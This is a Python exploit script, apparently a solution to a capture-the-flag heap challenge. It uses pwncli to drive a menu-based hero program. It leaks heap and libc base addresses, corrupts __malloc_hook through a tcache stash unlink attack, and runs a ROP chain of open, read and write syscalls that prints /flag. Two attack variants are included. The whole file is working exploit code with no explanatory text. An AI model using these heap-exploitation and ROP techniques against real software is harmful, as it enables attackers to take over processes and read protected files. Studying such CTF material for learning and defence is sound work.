from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

pop_rdi_ret = 0x26542
pop_rsi_ret = 0x26f9e
pop_rdx_ret = 0x12bda6
pop_rax_ret = 0x47cf8
syscall_ret = 0xcf6c5


def debut(idx, size, name="a"):
    if isinstance(name, str):
        pad = "a"
    else:
        pad = b"a"
    name = name.ljust(size, pad)
    p.sendlineafter("> ", "1")
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("hero name: ", name)


def rename(idx, name):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("hero name: ", name)


def show(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))
    p.recvuntil("hero name: ")
    return u64(p.recvline()[:-1].ljust(8, b"\x00"))


def retire(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter("idx: ", str(idx))



def punch(data):
    p.sendlineafter("> ", "50056")
    p.send(data)
    p.recvuntil("Serious Punch!!!\n")
    

# use tcachebin stach unlink, while has 5, to malloc at any address
def attack1():
    debut(0, 0x400)
    retire(0)
    debut(1, 0x400)
    retire(1)

    heap_base_addr = show(1) - 0x260
    log_address("heap_base_addr", heap_base_addr)

    for i in range(5):
        debut(0, 0x400)
        retire(0)
    
    debut(0, 0x400)

    for i in range(5):
        debut(1, 0x210)
        retire(1)
    
    retire(0)
    libc_base_addr = show(0) - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    debut(1, 0x1e0)
    # get smallbin chunk
    debut(1, 0x400)
    payload = flat({
        0: [0, 0x221, heap_base_addr + 0x20b0, libc_base_addr + 0x1e4bf8],
        0x1e0: [0, 0x221, 0xdeadbeef, heap_base_addr + 0x1ed0]
    }, filler="\x00")
    rename(0, payload)

    # to trigger tcache stash unlink
    debut(1, 0x210)

    # to change __malloc_hook
    payload = flat({
        0x20: "/flag\x00\x00\x00",
        0x28: libc_base_addr + 0x99540
    })
    punch(payload)

    layout = [
        libc_base_addr + pop_rdi_ret, # rdi
        libc.sym["__malloc_hook"] - 8,
        libc_base_addr + pop_rsi_ret, # rsi
        0, 
        libc_base_addr + pop_rax_ret, # rax
        2, # open("/flag", 0)
        libc_base_addr + syscall_ret, # syscall
        libc_base_addr + pop_rdi_ret,
        3,
        libc_base_addr + pop_rsi_ret,
        heap_base_addr + 0x400, 
        libc_base_addr + pop_rdx_ret,
        0x30,
        libc_base_addr + pop_rax_ret,
        0, # read
        libc_base_addr + syscall_ret,
        libc_base_addr + pop_rdi_ret,
        1,
        libc_base_addr + pop_rax_ret,
        1, 
        libc_base_addr + syscall_ret
    ]

    debut(1, 0x300, flat(layout))

    p.interactive()


# use tcachebin stach unlink, while has 6, to write heap address at any address
def attack2():
    debut(0, 0x400)
    retire(0)
    debut(1, 0x400)
    retire(1)

    heap_base_addr = show(1) - 0x260
    log_address("heap_base_addr", heap_base_addr)

    for i in range(5):
        debut(0, 0x400)
        retire(0)
    
    debut(0, 0x400)

    for i in range(6):
        debut(1, 0x2f0)
        retire(1)
    
    debut(2, 0x210)
    retire(2)
    # stop()

    retire(0)
    libc_base_addr = show(0) - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    debut(1, 0x100)
    # get smallbin chunk
    debut(1, 0x400)
    payload = flat({
        0: [0, 0x301, heap_base_addr + 0x1fd0, heap_base_addr + 0x20 - 5],
        0x100: [0, 0x301, 0xdeadbeef, heap_base_addr + 0x1ed0]
    }, filler="\x00")
    rename(0, payload)

    # to trigger tcache stash unlink
    debut(1, 0x2f0)
    stop()

    rename(2, p64(libc.sym['__malloc_hook']-8))

    punch("a" * 0x60)

    punch(b"/flag\x00\x00\x00" + p64(libc_base_addr + 0x8cfd6)) # add rsp 0x48; ret

    layout = [
        libc_base_addr + pop_rdi_ret, # rdi
        libc.sym["__malloc_hook"] - 8,
        libc_base_addr + pop_rsi_ret, # rsi
        0, 
        libc_base_addr + pop_rax_ret, # rax
        2, # open("/flag", 0)
        libc_base_addr + syscall_ret, # syscall
        libc_base_addr + pop_rdi_ret,
        3,
        libc_base_addr + pop_rsi_ret,
        heap_base_addr + 0x400, 
        libc_base_addr + pop_rdx_ret,
        0x30,
        libc_base_addr + pop_rax_ret,
        0, # read
        libc_base_addr + syscall_ret,
        libc_base_addr + pop_rdi_ret,
        1,
        libc_base_addr + pop_rax_ret,
        1, 
        libc_base_addr + syscall_ret
    ]

    debut(1, 0x300, flat(layout))

    p.interactive()


attack2()